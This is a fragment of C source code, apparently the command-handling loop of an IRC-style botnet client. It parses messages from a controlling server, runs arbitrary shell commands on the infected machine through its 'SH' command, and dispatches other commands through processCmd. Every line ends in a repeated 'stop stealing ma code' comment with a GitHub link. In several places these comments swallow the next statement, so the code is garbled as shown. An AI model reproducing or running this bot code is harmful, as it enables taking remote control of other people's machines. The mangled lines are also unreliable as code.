unsigned char *nickMask = message + 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(*nickMask != ' ' && *nickMask != 0x00) nickMask++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(*nickMask == 0x00) continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*(nickMask) = 0x00; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
nickMask = message + 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owomessage = message + strlen(nickMask) + 2; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(message[strlen(message) - 1] == '\n' || message[strlen(message) - 1] == '\r') message[strlen(message) - 1] = 0x00; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *command = message; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(*message != ' ' && *message != 0x00) message++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
*message = 0x00; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
message++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *tmpcommand = command; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(*tmpcommand) { *tmpcommand = toupper(*tmpcommand); tmpcommand++; } // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(strcmp(command, "SH") == 0) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char buf[1024]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int command; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if (listFork()) continue; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(buf, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
szprintf(buf, "%s 2>&1", message); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
command = fdpopen(buf, "r"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
while(fdgets(buf, 1024, command) != NULL) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
trim(buf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//                                                sockprintf(mainCommSock, "%s", buf); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(buf, 0, 1024); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
sleep(1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
fdpclose(command); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
exit(0); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owounsigned char *params[10]; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int paramsCount = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
unsigned char *pch = strtok(message, " "); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
params[0] = command; // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owowhile(pch) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
if(*pch != '\n') // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
params[paramsCount] = (unsigned char *)malloc(strlen(pch) + 1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
memset(params[paramsCount], 0, strlen(pch) + 1); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
strcpy(params[paramsCount], pch); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
paramsCount++; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
pch = strtok(NULL, " "); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoprocessCmd(paramsCount, params); // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-owoif(paramsCount > 1) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
int q = 1; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
for(q = 1; q < paramsCount; q++) // stop stealing ma code skidz -> https://github.com/riu-developer-owo
{ // stop stealing ma code skidz -> https://github.com/riu-developer-owo
free(params[q]); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
//printf("Link closed by server.\n"); // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo

 // stop stealing ma code skidz -> https://github.com/riu-developer-oworeturn 0; // stop stealing ma code skidz -> https://github.com/riu-developer-owo
} // stop stealing ma code skidz -> https://github.com/riu-developer-owo
